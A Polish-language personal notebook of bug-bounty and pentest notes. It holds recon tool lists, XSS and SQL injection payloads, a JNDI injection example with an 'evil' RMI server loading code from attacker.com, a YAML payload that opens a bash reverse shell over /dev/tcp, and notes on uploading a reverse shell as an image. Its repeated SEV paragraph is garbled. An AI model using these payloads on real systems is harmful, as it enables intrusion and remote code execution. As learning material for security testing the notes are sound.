To polecenie wyświetla listę wszystkich usług uruchomionych w celu Windows. Znajomość usług działających na celu pozwala określić potencjalne wektory ataku. Jako obrońca, użycie tego polecenia ujawnia powierzchnię ataku i może ujawnić potencjalnie złośliwe usługi działające na twoim punkcie końcowym.

`Get-ChildItem -Path C:\ -Include *[FILENAME]* -File -Recurse -ErrorAction SilentlyContinue`
To polecenie pomaga znaleźć lokalizację określonego pliku w miejscu docelowym. Jest to szczególnie przydatne w przypadku zdarzeń przechwytywania flagi (CTF) , gdy ogólnie znasz nazwę flagi, ale możesz nie wiedzieć, gdzie jest przechowywana.

`Get-LocalUser`


hashowanie tekstu przez kali linux, komenda: `echo -n 'MyPassword' | md5sum`

https://www.orangecyberdefense.com/global/blog/ethical-hacking/ethical-hacking-all-about-physical-intrusions


**Wyodrębnianie sekretów z zaszyfrowanych maszyn wirtualnych**:
AMD SEV to sprzętowe rozszerzenie szyfrowania pamięci głównej w systemach z wieloma dzierżawcami. SEV wykorzystuje wbudowany koprocesor, AMD Secure Processor, do przezroczystego szyfrowania pamięci maszyny wirtualnej za pomocą indywidualnych, efemerycznych kluczy, które nigdy nie opuszczają koprocesora. Celem jest ochrona poufności pamięci dzierżawców przed złośliwym lub zagrożonym hypervisorem oraz przed atakami na pamięć, na przykład poprzez zimny rozruch lub DMA. Atak SEVered pokazał, że hiperwizor może jednak wyodrębnić pamięć w postaci zwykłego tekstu z maszyn wirtualnych zaszyfrowanych SEV bez dostępu do ich kluczy szyfrujących. Jednak szyfrowanie utrudnia tradycyjnym technikom introspekcji maszyny wirtualnej lokalizowanie sekretów w pamięci przed wyodrębnieniem. Może to wymagać wyodrębnienia dużej ilości pamięci w celu odzyskania określonych sekretów, a tym samym skutkować czasochłonnym, oczywistym atakiem. Przedstawiamy podejście, które umożliwia złośliwemu hypervisorowi szybką identyfikację i kradzież tajemnic, takich jak klucze TLS, SSH czy FDE, z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież. Klucze SSH lub FDE z zaszyfrowanych maszyn wirtualnych na obecnym sprzęcie SEV. Najpierw obserwujemy aktywność maszyny wirtualnej z poziomu hiperwizora, aby wywnioskować, które obszary pamięci najprawdopodobniej zawierają sekrety. Następnie systematycznie wyodrębniamy te obszary pamięci i na bieżąco analizujemy ich zawartość. Pozwala to na skuteczne odzyskiwanie ukierunkowanych tajemnic, znacznie zwiększając szanse na szybką, solidną i ukrytą kradzież.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# bug bounty

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
rekonesans:
* * *https://securityheaders.com/
* * *https://threatcrowd.org/
* * *https://publicwww.com/
* * *http://ipv4info.com/
* * *https://pentest-tools.com/
* * *netcraft
* * *https://osint.sh/

luki w zabezpieczeniach:
XSS: `<script>alert(document.domain)</script>`
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#

metadane exif nie są usuwane z profilu [POC]: http://exif.regex.info/ 
**Przykład**: https://youtu.be/LtQO4aRpzx8

**atak ddos przez nie ustalenie limitu hasła**

SQL injection przykłąd: `https://test.com/productskategoria=gifty'+OR+1=1--`
panel administratora SQL: `admin' #`

Luka w zabezpieczeniach omijania adresu email:https://youtu.be/ow3lT0Kmi-I

Xmlrpc.php bruteforce: https://youtu.be/r5ToGBIZRI0

NAUKA github/youtube/google:
https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters
https://github.com/EdOverflow/bugbounty-cheatsheet
https://github.com/djadmin/awesome-bug-bounty#getting-started
https://bughunters.google.com/
https://github.com/HolyBugx/HolyTips/tree/main/
https://github.com/CHYbeta/Web-Security-Learning
https://github.com/m0chan/BugBounty

WAZNE NAUKA:
https://github.com/5bhuv4n35h/pentestmindmap
https://github.com/pdelteil/BugBountyReportTemplates
https://github.com/infosecn1nja/AD-Attack-Defense


narzędzia:
* https://github.com/m4ll0k/BBTz
* wfuzz
* dirsearch
* nmap
* burpsuite
* wpscan
*  subzy =  sudo su`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt` (**komenda**)

najlepsze ze strony https://medium.com/:
https://medium.com/bug-bounty-hunting/coping-up-with-bug-bounty-failures-7d9ca4e6d257
https://medium.com/@santocheung/basic-csrf-8e135c6e2b0d
https://medium.com/@circleninja
https://medium.com/@santocheung/

**ProxyShell składa się z 3 luk**

## Wszystkie luki CVE: https://cve.mitre.org/

## REECON CAŁEJ STRONY:
`cd reconftw`
`sudo proxychains ./reconftw.sh -d NAZWA-STRONA -r` 

znaleziona luka sql https://www.jhaddix.com/post/bug-bounty-hacking-diary-4-8-22

**Pełna metodologia przejęcia subdomeny (narzędzie** **SUBZY**)
https://youtu.be/xQVE3yybti0

KOMENDY: `subzy -target NAZWA SUBDOMENY`

`subzy -targets /home/kali/Desktop/sql.txt | tee -a subzy.txt`

https://medium.com/@nynan/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366

XSStrike:
`XSSTRIKE - proxychains python3 xsstrike.py -u "strona.com/parametr typu id"`

`proychains ./xsstrike.py -u "http://URL/" --crawl`

WSZYSTKIE PRZKŁAY: https://github.com/s0md3v/XSStrike/wiki/Usage

test api: **cd gmascapiscanner**
`python3 maps_api_scanner_python3.py --api-key API`

## **## JAK NAJMNIEJ AUTOMATYZACJI**

domain extractor - https://beautifycode.net/domain-extractor


![2022-04-21 15_21_55-Bug-Bounty-Playbook.pdf — Osobisty — Microsoft​ Edge.png](:/6cf7b6a198d144c7bc51966d27c5f65a)


Jeśli zobaczysz stronę Apache Struts, możesz spróbować niektórych znanych CVE, lista jest długa.
luki w zabezpieczeniach. Na przykład, jeśli widzisz, że witryna korzysta z WordPressa, możesz uruchomić skaner WordPress.


Serwer bazy danych odpowiada za wiele funkcji, w tym za odczytywanie, wyszukiwanie i zapisywanie do bazy danych. Aplikacja internetowa do zakupów online może wymagać dostępu do więcej niż jednej bazy danych, na przykład:

* * ***Baza produktów**: ta baza danych zawiera szczegółowe informacje o produktach, takie jak nazwa, zdjęcia, specyfikacje i cena.
* * ***Baza klientów**: zawiera wszystkie szczegóły związane z klientami, takie jak imię i nazwisko, adres, e-mail i numer telefonu.
* * ***Baza danych sprzedaży:** Oczekujemy, że w tej bazie danych zobaczymy, co kupił każdy klient i jak zapłacił.



Poniższy obraz przedstawia wyszukiwanie produktu w witrynie zakupów online. W najprostszej wersji wyszukiwanie obejmie cztery kroki:


![2022-05-13 21_12_08-SpróbujHackMe _ Bezpieczeństwo aplikacji internetowych.png](:/cfe31d7aa4f64790ba27c80659d9201c)

Użytkownik wprowadza nazwę przedmiotu lub powiązane słowa kluczowe w polu wyszukiwania. Przeglądarka internetowa wysyła słowa kluczowe wyszukiwania do aplikacji internetowej zakupów online.
Aplikacja internetowa przeszukuje (przeszukuje) bazę produktów pod kątem wprowadzonych słów kluczowych.
Baza produktów zwraca wyniki wyszukiwania pasujące do podanych słów kluczowych do aplikacji internetowej.
Aplikacja internetowa formatuje wyniki jako przyjazną stronę internetową i zwraca je użytkownikowi.

![b5459db6d49897741f063cb33711e4c0.png](:/1dcdf4cd165e48eaa7af93fe5e19bff7)

**luka IDOR może wystąpić, jeśli dane wejściowe wzbudziły zbyt duże zaufanie. Innymi słowy, aplikacja internetowa nie sprawdza, czy użytkownik ma uprawnienia dostępu do żądanego obiektu.**

**Rozważmy bardziej krytyczny przykład; adres URL https://store.tryhackme.thm/customers/user?id=16zwróciłby użytkownika z id=16. Ponownie oczekujemy, że użytkownicy będą mieli kolejne numery identyfikacyjne. Atakujący próbowałby wypróbować inne numery i prawdopodobnie uzyskać dostęp do innych kont użytkowników. Ta luka może działać z plikami sekwencyjnymi; na przykład, jeśli atakujący widzi 007.txt, może wypróbować inne liczby, takie jak 001.txt, 006.txti 008.txt**

----------------------------------------------------------------------
**Java Naming and Directory Interface (JNDI) to Java API, które umożliwia klientom wykrywanie i wyszukiwanie danych i obiektów za pomocą nazwy. Obiekty te mogą być przechowywane w różnych usługach nazewniczych lub katalogowych, takich jak Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP) lub Domain Name Service (DNS).**
**Innymi słowy, JNDI jest prostym interfejsem API Java (takim jak „InitialContext.lookup(String name)” ), który przyjmuje tylko jeden parametr ciągu, a jeśli ten parametr pochodzi z niezaufanego źródła, może prowadzić do zdalnego wykonania kodu przez zdalną klasę Ładowanie.**
**Kiedy nazwa żądanego obiektu jest kontrolowana przez atakującego, możliwe jest skierowanie ofiary aplikacji Java do złośliwego serwera rmi/ldap/corba i odpowiedź z dowolnym obiektem. Jeśli ten obiekt jest instancją klasy „javax.naming.Reference”, klient JNDI próbuje rozpoznać atrybuty „classFactory” i „classFactoryLocation” tego obiektu. Jeśli wartość „classFactory” jest nieznana docelowej aplikacji Java, Java pobiera kod bajtowy fabryki z lokalizacji „classFactoryLocation” za pomocą URLClassLoader Java.**

Przykłąd podatnej aplikacji:
```
@RequestMapping("/lookup")
	@Example(uri = {"/lookup?name=java:comp/env"})
	public Object lookup(@RequestParam String name) throws Exception{
	    return new javax.naming.InitialContext().lookup(name);
	}
```

Wykorzystanie wstrzyknięć JNDI przed JDK 1.8.0_191
Żądając adresu URL „/lookup/?name=ldap://127.0.0.1:1389/Object” możemy sprawić, że podatny serwer połączy się z naszym kontrolowanym adresem. Aby wyzwolić zdalne ładowanie klasy, złośliwy serwer RMI może odpowiedzieć za pomocą następującego odniesienia:

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
  ```
//creating a reference with 'ExportObject' factory with the factory location of 'http://_attacker.com_/'
        Reference ref = new javax.naming.Reference("ExportObject","ExportObject","http://_attacker.com_/");
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```
Ponieważ "ExploitObject" jest nieznany serwerowi docelowemu, jego kod bajtowy zostanie załadowany i wykonany z " http://_attacker.com_/ExploitObject.class ", wyzwalając RCE.
---------------------------------------------------
Luka IDOR może wystąpić, gdy serwer sieciowy otrzymuje dane wejściowe dostarczone przez użytkownika w celu pobrania obiektów (plików, danych, dokumentów), a do tych danych 
wejściowych zostało zbyt duże zaufanie, a aplikacja sieciowa nie weryfikuje, czy użytkownik powinien, w mieć dostęp do żądanego obiektu

Komponent zapytania:
Dane komponentu zapytania są przekazywane w adresie URL podczas wysyłania zapytania do strony internetowej. Weźmy na przykład poniższy zrzut ekranu adresu URL.

![96ca5139d906961178a2ef917850f96d.png](:/c5e8025f1d634882875987cfa2b44bde)

- Protokół:  https://
- Domena: website.thm
- Strona:  /profil
- Komponent zapytania:  id=23

Zmienne postu:

Badanie zawartości formularzy na stronie internetowej może czasami ujawnić pola, które mogą być podatne na wykorzystanie IDOR. Weźmy na przykład poniższy kod HTML dla formularza, który aktualizuje hasło użytkownika.

```
<form method="POST" action="/update-password">
   <input type="hidden" name"user_id" value="123">
    <div>New Password:</div>
    <div><input type="password" name="new_password"></div>
    <div><input type="submit" value="Change Password">
</form>
```

Z podświetlonej linii widać(input type="hidden" name"user_id" value="123">), że identyfikator użytkownika jest przekazywany do serwera WWW w ukrytym polu Zmiana wartości tego pola z 123 na inny user_id może skutkować zmianą hasła do konta innego użytkownika/

omijanie autoryzacji 403:
narzędzie: byp4xx
komenda - proxychains python3 ./byp4xx.py -fuzz https://example.com/

https://github.com/swisskyrepo/PayloadsAllTheThings

nikto -host example.com

Niebezpieczne parsowanie YAML może umożliwić tworzenie obiektów Pythona i w rezultacie zdalne wykonanie kodu:
`!!python/object/apply:os.system ["bash -i >& /dev/tcp/yourIP/4444 0>&1"]`

dirbuster -u http://10.10.23.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

https://www.immuniweb.com

https://kalilinuxtutorials.com/subfinder/ (DOCKER)



-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
wykonanie polecenia¶
Gdy aplikacja musi wywołać zewnętrzne programy w celu przetworzenia treści, użyje niektórych funkcji do wykonania poleceń systemowych. systemNa przykład , exec, itp. w PHP shell_exec, gdy użytkownik może kontrolować parametry funkcji wykonywania poleceń, złośliwe polecenia systemowe mogą zostać wstrzyknięte do zwykłych poleceń, co skutkuje atakami polegającymi na wykonywaniu poleceń. Tutaj skupiamy się głównie na PHP, aby wprowadzić luki w wykonywaniu poleceń, a szczegóły dotyczące Javy i innych aplikacji mają zostać dodane.

plik zawiera¶
Jeśli klientowi zezwoli się na wprowadzanie i kontrolowanie plików dynamicznie umieszczanych na serwerze, doprowadzi to do wykonania złośliwego kodu i ujawnienia poufnych informacji, w tym głównie dwóch form dołączania plików lokalnych i dołączania plików zdalnych.

CSRF Fałszowanie żądań między witrynami¶
Cross-Site Request Forgery (CSRF) to atak, który powoduje, że zalogowany użytkownik wykonuje akcję bez jego wiedzy. Ponieważ atakujący nie może zobaczyć wyniku odpowiedzi na sfałszowane żądanie, ataki CSRF służą przede wszystkim do wykonywania działań, a nie do kradzieży danych użytkownika. Gdy ofiarą jest zwykły użytkownik, CSRF może realizować operacje takie jak przelewanie środków użytkownika i wysyłanie e-maili bez jego wiedzy, ale jeśli ofiarą jest użytkownik z uprawnieniami administratora, CSRF może zagrozić bezpieczeństwu całego systemu WEB.

Fałszowanie żądań po stronie serwera SSRF¶
SSRF (Server-Side Request Forgery: fałszowanie żądań po stronie serwera) to luka w zabezpieczeniach stworzona przez atakującego w celu utworzenia żądania zainicjowanego przez serwer. Zazwyczaj ataki SSRF są ukierunkowane na systemy wewnętrzne, które są niedostępne z sieci zewnętrznej.

Udostępnianie pliku¶
W trakcie działania serwisu nieunikniona jest aktualizacja niektórych stron lub treści serwisu, w tym czasie konieczne jest skorzystanie z funkcji przesyłania plików serwisu. Jeśli przesyłane pliki nie są objęte ograniczeniami lub ograniczenia są pomijane, funkcja ta może służyć do przesyłania plików wykonywalnych i skryptów na serwer, co dodatkowo spowoduje awarię serwera.

przechwytywanie kliknięć¶
Clickjacking został zapoczątkowany w 2008 roku przez ekspertów ds. Bezpieczeństwa internetowego Roberta Hansena i Jeremiaha Glusmana.

Jest to wizualna metoda oszustwa.Po stronie WEB ramka iframe zagnieżdża przezroczystą i niewidoczną stronę, umożliwiając użytkownikowi kliknięcie pozycji, w której atakujący chce oszukać użytkownika, aby kliknął bez wiedzy.

Ze względu na pojawienie się clickjackingu istnieje metoda zagnieżdżania zapobiegająca ramkom, ponieważ clickjacking wymaga do ataku zagnieżdżonych stron iframe.

Poniższy kod jest najczęstszym przykładem zapobiegania zagnieżdżaniu ramek:


if(top.location!=location)
    top.location=self.location;
Wirtualny prywatny serwer VPS¶
Technologia VPS (Virtual Private Server) to wysokiej jakości usługa, która dzieli serwer na wiele wirtualnych serwerów prywatnych. Technologia realizacji VPS dzieli się na technologię kontenerową i technologię wirtualizacji. W kontenerze lub maszynie wirtualnej każdemu VPS można przypisać niezależny publiczny adres IP, niezależny system operacyjny i przeprowadzić izolację miejsca na dysku, pamięci, zasobów procesora, procesów i konfiguracji systemu między różnymi VPS, symulując wyłączne użycie do użytkownicy i aplikacje Doświadczenie w korzystaniu z zasobów obliczeniowych. Podobnie jak samodzielny serwer, VPS może samodzielnie przeinstalować system operacyjny, zainstalować programy i zrestartować serwer. VPS zapewnia użytkownikom swobodę zarządzania i konfiguracji oraz może być używany do wirtualizacji przedsiębiorstwa i dzierżawy zasobów IDC.

Dzierżawa zasobów IDC zapewniana przez dostawcę VPS. Ze względu na różnice w sprzęcie, oprogramowaniu VPS i strategiach sprzedaży stosowanych przez różnych dostawców VPS, doświadczenie korzystania z VPS jest również zupełnie inne. Szczególnie, gdy dostawca VPS jest wyprzedany, a serwer fizyczny jest przeciążony, wydajność VPS będzie znacznie ograniczona. Relatywnie rzecz biorąc, technologia kontenerowa jest bardziej wydajna pod względem wykorzystania sprzętu niż technologia maszyn wirtualnych i łatwiej jest ją przecenić, więc ogólnie rzecz biorąc, cena VPS kontenerowego jest niższa niż VPS maszyny wirtualnej.

konkurs warunkowy¶
Warunkowa luka w zabezpieczeniach konkurencji jest luką po stronie serwera.Ponieważ po stronie serwera przetwarzane są żądania różnych użytkowników jednocześnie, jeśli współbieżność nie jest odpowiednio obsługiwana lub logiczna sekwencja powiązanych operacji nie jest odpowiednio zaprojektowana, takie problemy wystąpią.

XXE¶
XXE Injection oznacza XML External Entity Injection, znany również jako XML External Entity Injection Attack.Luka w zabezpieczeniach to problemy z bezpieczeństwem powstające podczas przetwarzania niezabezpieczonych danych podmiotu zewnętrznego.

W standardzie XML 1.0 pojęcie bytu (podmiotu) jest zdefiniowane w strukturze dokumentu XML. Podmiot można wywołać w dokumencie poprzez predefiniowanie, a identyfikator podmiotu może uzyskać dostęp do treści lokalnych lub zdalnych. Jeśli „zanieczyszczenie „Wprowadza się w tym procesie” źródło, po przetworzeniu dokumentu XML, może to prowadzić do problemów związanych z bezpieczeństwem, takich jak wyciek informacji.

XSCH¶
Ze względu na zaniedbania twórców stron internetowych w procesie tworzenia z wykorzystaniem Flasha, Silverlight itp., problem wystąpił z powodu braku poprawnej konfiguracji pliku zasad międzydomenowych (crossdomain.xml). Na przykład:


<cross-domain-policy>
    <allow-access-from domain=“*”/>
</cross-domain-policy>
Ponieważ plik zasad międzydomenowych jest skonfigurowany jako *, oznacza to, że Flash w dowolnej domenie może z nim wchodzić w interakcje, co daje możliwość inicjowania żądań i uzyskiwania danych.

Overreach (brak dostępu na poziomie funkcji)¶
Luka w zabezpieczeniach umożliwiająca naruszenie uprawnień jest powszechną luką w zabezpieczeniach aplikacji WEB. Jego zagrożenie polega na tym, że jedno konto może kontrolować dane użytkowników całej witryny. Oczywiście dane te są ograniczone do danych odpowiadających funkcjom z lukami. Główną przyczyną nieautoryzowanej luki w zabezpieczeniach jest to, że programista nadmiernie ufał danym żądanym przez klienta podczas dodawania, usuwania, modyfikowania i wysyłania zapytań do danych i nie trafił w osąd organu. Dlatego testowanie nieautoryzowanego dostępu to proces ciężkiej pracy z programistami.

Wyciek wrażliwych informacji¶
Informacje wrażliwe odnoszą się do informacji, które nie są znane opinii publicznej, mają rzeczywistą i potencjalną wartość użytkową i wyrządzają szkodę społeczeństwu, przedsiębiorstwom lub osobom fizycznym w przypadku ich utraty, niewłaściwego wykorzystania lub uzyskania do nich dostępu bez zezwolenia. W tym: informacje dotyczące prywatności, informacje dotyczące działalności biznesowej, informacje finansowe, informacje dotyczące personelu, informacje dotyczące obsługi i konserwacji IT itp. Kanały wycieku obejmują Github, bibliotekę Baidu, kod Google, katalogi stron internetowych itp.

zła konfiguracja zabezpieczeń¶
Błędna konfiguracja zabezpieczeń: czasami użycie domyślnej konfiguracji zabezpieczeń może narazić aplikację na wiele ataków. Bardzo ważne jest, aby istniejące najlepsze konfiguracje zabezpieczeń były używane we wdrożonych aplikacjach, serwerach WWW, serwerach baz danych, systemach operacyjnych, bibliotekach kodu i wszystkich komponentach związanych z aplikacjami.

zażądać przemytu¶
W protokole HTTP istnieją dwa nagłówki określające koniec żądania, a mianowicie Content-Length i Transfer-Encoding. W złożonym środowisku sieciowym różne serwery wdrażają standardy RFC na różne sposoby. W związku z tym dla tego samego żądania HTTP różne serwery mogą generować różne wyniki przetwarzania, co stwarza zagrożenie dla bezpieczeństwa.

zatrucie TLS¶
W protokole TLS istnieje mechanizm multipleksowania sesji. Gdy klient obsługujący ten typ funkcji uzyskuje dostęp do złośliwego serwera TLS, klient przechowuje sesję wysłaną przez złośliwy serwer. Gdy klient ponownie wykorzystuje sesję, DNS Rebinding może zrealizować pozwalając klient wysyła złośliwe Sesje do usług intranetowych, osiągając w ten sposób efekt ataków SSRF, w tym możliwość dowolnego zapisu do usług intranetowych, takich jak Memcached, a następnie współpracuje z innymi lukami w celu spowodowania RCE i innych zagrożeń.

XS-przecieki¶
Wycieki typu cross-site scripting (znane również jako XS-Leaks/XSLeaks) to rodzaj luki wywodzącej się z wbudowanego kanału bocznego platformy internetowej. Zasada polega na wykorzystaniu tego bocznego kanału w sieci do ujawnienia poufnych informacji o użytkowniku, takich jak dane użytkownika w innych aplikacjach sieciowych, informacje o lokalnym środowisku użytkownika lub informacje o sieci wewnętrznej, z którą użytkownik jest połączony.

Atak wykorzystuje podstawową zasadę platformy internetowej — możliwość komponowania, która umożliwia stronom interakcję ze sobą i nadużywanie legalnych mechanizmów w celu uzyskania informacji o użytkownikach. Główna różnica między tym atakiem a technologią cross-site request forgery (CSRF) polega na tym, że XS-Leaks nie fałszuje żądań użytkownika w celu wykonania operacji, ale jest używany do wnioskowania i uzyskiwania informacji o użytkowniku.

Przeglądarki udostępniają różnorodne funkcje wspierające interakcję między różnymi aplikacjami internetowymi; na przykład przeglądarki umożliwiają jednej stronie ładowanie podzasobów, nawigację lub wysyłanie wiadomości do innej aplikacji. Podczas gdy te zachowania są zwykle ograniczone przez mechanizmy bezpieczeństwa platform internetowych (takie jak polityka tego samego pochodzenia), XS-Leaks wykorzystuje różne zachowania podczas interakcji między stronami internetowymi w celu ujawnienia informacji o użytkownikach.

WAF¶
System ochrony aplikacji internetowych (znany również jako: system zapobiegania włamaniom na poziomie aplikacji internetowej. Angielski: Web Application Firewall, dalej: WAF). Używając uznanego na całym świecie stwierdzenia: Zapora aplikacji WEB to produkt, który zapewnia ochronę aplikacji WEB poprzez wdrożenie szeregu zasad bezpieczeństwa dla HTTP/HTTPS.

IDS¶
IDS to skrót od Intrusion Detection Systems w języku angielskim i oznacza „Intrusion Detection System” w języku chińskim. Profesjonalnie rzecz biorąc, zgodnie z określoną strategią bezpieczeństwa, za pomocą oprogramowania i sprzętu, monitoruj stan działania sieci i systemu oraz wykrywaj różne próby ataków, zachowania ataków lub wyniki ataków w jak największym stopniu, aby zapewnić poufność i integralność zasoby systemu sieciowego i dostępność. Zrób metaforę obrazu: jeśli zapora ogniowa jest zamkiem w drzwiach budynku, to system IDS jest systemem monitoringu w tym budynku. Gdy złodziej wejdzie do budynku przez okno lub osoba z wewnątrz przekroczy granicę, tylko system monitoringu w czasie rzeczywistym może wykryć sytuację i wydać ostrzeżenie.

IPS¶
Intrusion Prevention System (IPS: Intrusion Prevention System) to narzędzie zabezpieczające sieć komputerową oraz uzupełnienie oprogramowania antywirusowego (programy antywirusowe) i zapory ogniowej (Filtr pakietów, Application Gateway). System zapobiegania włamaniom (system zapobiegania włamaniom) to urządzenie zabezpieczające sieć komputerową, które może monitorować zachowanie transmisji danych sieciowych w sieci lub sprzęcie sieciowym i może natychmiast przerywać, dostosowywać lub izolować niektóre nieprawidłowe lub szkodliwe zachowania transmisji danych w sieci.
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


DIRSEARCH -  dirsearch -u 10.10.120.28  -e / -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50/lub 10 -b -r -f

subdomains - https://subdomains.whoisxmlapi.com/


Podczas przesyłania pliku do „partners.line.me” z nazwą pliku zawierającą ładunek XSS, serwer nie zmienił nazwy pliku. To spowodowało, że XSS oparty na DOM został osadzony w HTML. Przesłane pliki były przechowywane tylko przez określony czas. Jednak dopóki były dostępne na serwerze, dostęp do ścieżki wyzwalał XSS, a zapisany ładunek był wyświetlany bez ucieczki. Okazało się jednak, że kradzież ciasteczek nie jest możliwa.


Self XSS To xss który widzisz tylko ty.
Przykład - https://whitton.io/articles/uber-turning-self-xss-into-good-xss/

Wydaję mi się że ładunek xss w plkach lub zdjęciach jest w ten sposób przesyłany. Włączony Burp Suite --> Wysłanie norlamnego pliku/Zdjęcia na stronę --> Przechwycenie żądania i zmienienie nazwy pliku na payload XSS
https://whitton.io/articles/xss-on-facebook-via-png-content-types/

NAUKA - https://www.hacksplaining.com/
                https://www.amanhardikar.com/mindmaps/Practice.html
				https://forum.bugcrowd.com/t/researcher-resources-tutorials/370
				https://www.reddit.com/r/netsec/

https://forum.bugcrowd.com/t/researcher-resources-bounty-bug-write-ups/1137
				
https://www.bugcrowd.com/blog/getting-started-bug-bounty-hunter-methodology/
				
https://forum.bugcrowd.com/t/researcher-resources-how-to-become-a-bug-bounty-hunter/1102

dns tool - https://code.google.com/archive/p/dns-discovery/

https://dnsdumpster.com/


przesyłanie odwróconej powłoki do witryny w miejscu gdzie jest przeznaczone przesyłanie zdjęć:

mogę przesłać plik img, png. Mogę zmienić rozszerzenie na .php7.

Nie mogę po prostu przesłać pliku .php7, ale działa to, gdy konwertuję zwykły plik jpg na plik .php7

https://github.com/sAjibuu/upload_bypass
///Najprawdopodobniej po stronie serwera sprawdzają, czy jest to obraz. Użyj edytora szesnastkowego i umieść odpowiednie tagi w kodzie. Po prostu google i eksperymentuj. Następnie możesz zrobić dowolne rozszerzenie.\\\

-----------------------------------------------------------------------
## **RECON**
Koncepcje tła
Poziomy są ważną koncepcją dla tego dokumentu i dla PTES jako całości. Jest to swego rodzaju model dojrzałości dla pentestów. Definiowanie poziomów pozwala nam sprecyzować oczekiwane wyniki i działania w ramach pewnych rzeczywistych ograniczeń, takich jak czas, wysiłek, dostęp do informacji itp.

Poziomy zbierania danych wywiadowczych są obecnie podzielone na trzy kategorie, a dla każdej z nich podano typowy przykład. Powinny one kierować dodawaniem technik w poniższym dokumencie. Na przykład intensywna czynność, taka jak utworzenie profilu na Facebooku i analiza sieci społecznościowej celu, jest odpowiednia w bardziej zaawansowanych przypadkach i powinna być oznaczona odpowiednim poziomem. Zobacz mapę myśli poniżej, aby zobaczyć przykłady.

Zbieranie informacji poziomu 1
(pomyśl: Napędzany zgodnością) Głównie proces zbierania informacji za pomocą kliknięcia przycisku. Ten poziom informacji można uzyskać prawie wyłącznie za pomocą zautomatyzowanych narzędzi. Absolutne minimum, aby powiedzieć, że zrobiłeś IG dla PT.

Acme Corporation musi być zgodna z PCI / FISMA / HIPAA. Wysiłek w zakresie gromadzenia informacji na poziomie 1 powinien być odpowiedni do spełnienia wymogu zgodności.

Zbieranie informacji na poziomie 2
(pomyśl: najlepsza praktyka) Ten poziom można utworzyć za pomocą zautomatyzowanych narzędzi z poziomu 1 i ręcznej analizy. Dobre zrozumienie firmy, w tym informacji, takich jak fizyczna lokalizacja, relacje biznesowe, schemat organizacyjny itp.

Firma Widgets Inc musi działać zgodnie z PCI, ale jest zainteresowana długoterminową strategią bezpieczeństwa i przejmuje kilku mniejszych producentów widżetów. Wysiłek w zakresie gromadzenia informacji na poziomie 2 powinien być odpowiedni do ich potrzeb.

Zbieranie informacji na poziomie 3
(pomyśl: sponsorowany przez państwo) Bardziej zaawansowany pentest, Redteam, pełny zakres. Wszystkie informacje z poziomu 1 i poziomu 2 wraz z wieloma ręcznymi analizami. Pomyśl o kultywowaniu relacji w SocNet, ciężkiej analizie, głębokim zrozumieniu relacji biznesowych, najprawdopodobniej dużej liczbie godzin na zebranie i korelację.

Zespół Armii Czerwonej ma za zadanie przeanalizować i zaatakować segment sieci armii w obcym kraju, aby znaleźć słabe punkty, które mogłyby zostać wykorzystane przez cudzoziemca. W tym przypadku odpowiednie byłoby podjęcie działań w zakresie gromadzenia informacji na poziomie 3.

Zdobywanie informacji
Co to jest
Intelligence Gathering przeprowadza rekonesans przeciwko celowi, aby zebrać jak najwięcej informacji, które można wykorzystać podczas penetracji celu podczas oceny podatności i faz eksploatacji. Im więcej informacji uda Ci się zebrać w tej fazie, tym więcej wektorów ataku możesz wykorzystać w przyszłości.

Wywiad typu open source (OSINT) to forma zarządzania zbiorami danych wywiadowczych, która obejmuje wyszukiwanie, selekcję i pozyskiwanie informacji z publicznie dostępnych źródeł oraz analizowanie ich w celu uzyskania użytecznych informacji. [1]

Po co to robić
Przeprowadzamy gromadzenie danych Open Source Intelligence w celu określenia różnych punktów wejścia do organizacji. Te punkty wejścia mogą być fizyczne, elektroniczne i/lub ludzkie. Wiele firm nie bierze pod uwagę, jakie informacje o sobie udostępniają publicznie i jak te informacje mogą zostać wykorzystane przez zdeterminowanego atakującego. Ponadto wielu pracowników nie bierze pod uwagę, jakie informacje o sobie umieszczają publicznie i jak te informacje mogą zostać wykorzystane do zaatakowania ich samych lub ich pracodawcy.

Co to nie jest
OSINT może nie być dokładny lub aktualny. Źródła informacji mogą być celowo/przypadkowo zmanipulowane w celu odzwierciedlenia błędnych danych, informacje mogą stać się przestarzałe w miarę upływu czasu lub po prostu być niekompletne.

Nie obejmuje nurkowania w śmietnikach ani żadnych metod odzyskiwania informacji o firmie z fizycznych przedmiotów znalezionych na terenie firmy.

Wybór celu
Identyfikacja i nazewnictwo celu
